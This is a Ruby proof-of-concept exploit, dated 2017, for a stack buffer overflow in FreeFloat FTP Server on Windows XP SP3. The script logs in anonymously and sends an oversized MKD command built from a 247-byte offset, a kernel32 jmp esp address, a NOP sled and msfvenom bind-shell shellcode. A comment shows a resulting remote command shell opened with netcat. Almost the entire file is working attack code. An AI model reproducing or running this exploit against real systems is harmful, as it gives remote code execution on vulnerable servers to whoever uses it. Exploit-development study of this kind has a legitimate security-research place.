# Brad Beacham 2017
#
require 'socket'

# Appends notifications to the start of text (ie. [*], [+], etc)
#####################################################################################
class String
	def error;        "\e[31m[!]\e[0m #{self}" end        # [!] Red
	def fail;         "\e[31m[-]\e[0m #{self}" end		  # [-] Red
	def success;      "\e[32m[+]\e[0m #{self}" end        # [+] Green
	def event;        "\e[34m[*]\e[0m #{self}" end        # [*] Blue
	def debug;        "\e[35m[%]\e[0m #{self}" end        # [%] Magenta
	def notification; "[-] #{self}" end                   # [-]
end
# Some simple input validation
input = ARGV
if input[0].nil?
	puts "USAGE: freefloatPOC.rb [<ipaddres>:<port>]".error
	abort()
elsif !input[0].include? ":"
	puts "USAGE: freefloatPOC.rb [<ipaddres>:<port>]".error
	abort()
end
host = input[0].split(":").first
port = input[0].split(":").last

puts "#######################################################".event
#####################################################################################
# INFORMATION
# Confirmed on Windows XP SP3
# EIP contains normal pattern : 0x69413269 (offset 247)
# Badchars: "\x00\x0A\x0D"
# 0x7C86467B : jmp esp #  ret  | kernal32.dll
#
# nc -nv 192.168.217.133 9876
# root@BradKali:~/# nc -nv 192.168.217.133 9876
# (UNKNOWN) [192.168.217.133] 9876 (?) open
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\Documents and Settings\Brad\Desktop\687ef6f72dcbbf5b2506e80a375377fa-freefloatftpserver\Win32>
#####################################################################################
# Generate the exploit
buffer = 1000
offset = 247

#msfvenom -p windows/shell_bind_tcp LPORT=9876 -e x86/shikata_ga_nai -b '\x00\x0A\x0D' -i 1 -f ruby
buf =
"\xb8\xa5\xc0\x66\x53\xdd\xc3\xd9\x74\x24\xf4\x5b\x31\xc9" +
"\xb1\x53\x31\x43\x12\x83\xeb\xfc\x03\xe6\xce\x84\xa6\x14" +
"\x26\xca\x49\xe4\xb7\xab\xc0\x01\x86\xeb\xb7\x42\xb9\xdb" +
"\xbc\x06\x36\x97\x91\xb2\xcd\xd5\x3d\xb5\x66\x53\x18\xf8" +
"\x77\xc8\x58\x9b\xfb\x13\x8d\x7b\xc5\xdb\xc0\x7a\x02\x01" +
"\x28\x2e\xdb\x4d\x9f\xde\x68\x1b\x1c\x55\x22\x8d\x24\x8a" +
"\xf3\xac\x05\x1d\x8f\xf6\x85\x9c\x5c\x83\x8f\x86\x81\xae" +
"\x46\x3d\x71\x44\x59\x97\x4b\xa5\xf6\xd6\x63\x54\x06\x1f" +
"\x43\x87\x7d\x69\xb7\x3a\x86\xae\xc5\xe0\x03\x34\x6d\x62" +
"\xb3\x90\x8f\xa7\x22\x53\x83\x0c\x20\x3b\x80\x93\xe5\x30" +
"\xbc\x18\x08\x96\x34\x5a\x2f\x32\x1c\x38\x4e\x63\xf8\xef" +
"\x6f\x73\xa3\x50\xca\xf8\x4e\x84\x67\xa3\x06\x69\x4a\x5b" +
"\xd7\xe5\xdd\x28\xe5\xaa\x75\xa6\x45\x22\x50\x31\xa9\x19" +
"\x24\xad\x54\xa2\x55\xe4\x92\xf6\x05\x9e\x33\x77\xce\x5e" +
"\xbb\xa2\x7b\x56\x1a\x1d\x9e\x9b\xdc\xcd\x1e\x33\xb5\x07" +
"\x91\x6c\xa5\x27\x7b\x05\x4e\xda\x84\x0f\x1b\x53\x62\x25" +
"\x33\x32\x3c\xd1\xf1\x61\xf5\x46\x09\x40\xad\xe0\x42\x82" +
"\x6a\x0f\x53\x80\xdc\x87\xd8\xc7\xd8\xb6\xde\xcd\x48\xaf" +
"\x49\x9b\x18\x82\xe8\x9c\x30\x74\x88\x0f\xdf\x84\xc7\x33" +
"\x48\xd3\x80\x82\x81\xb1\x3c\xbc\x3b\xa7\xbc\x58\x03\x63" +
"\x1b\x99\x8a\x6a\xee\xa5\xa8\x7c\x36\x25\xf5\x28\xe6\x70" +
"\xa3\x86\x40\x2b\x05\x70\x1b\x80\xcf\x14\xda\xea\xcf\x62" +
"\xe3\x26\xa6\x8a\x52\x9f\xff\xb5\x5b\x77\x08\xce\x81\xe7" +
"\xf7\x05\x02\x17\xb2\x07\x23\xb0\x1b\xd2\x71\xdd\x9b\x09" +
"\xb5\xd8\x1f\xbb\x46\x1f\x3f\xce\x43\x5b\x87\x23\x3e\xf4" +
"\x62\x43\xed\xf5\xa6"

junk = "\x41" * offset
#eip = [0x7C86467B].pack("V")
eip = "\x7B\x46\x86\x7C"
evil = "\x90" * 20 + buf
filler = "\x43" * (buffer - (junk.length + eip.length + evil.length))
# The final chunk of data which we will send to the server to trigger the exploit.
exploit = junk + eip + evil + filler

#####################################################################################
# Send the exploit
begin
	puts "Connecting to FTP server [#{host}:#{port}] and sending evil buffer".event
	puts ""
	socket = TCPSocket.new(host, port)
	data = socket.recv(1024)
	socket.write("USER anonymous\r\n")
	socket.recv(1024)
	socket.write("PASS anonymous\r\n")
	socket.recv(1024)
	socket.write("MKD #{exploit}\r\n")
	socket.recv(1024)
    socket.write "QUIT\n"
	socket.close
rescue
	puts "Unable to connect to FTP server!".error
	puts ""
end
 
puts ""
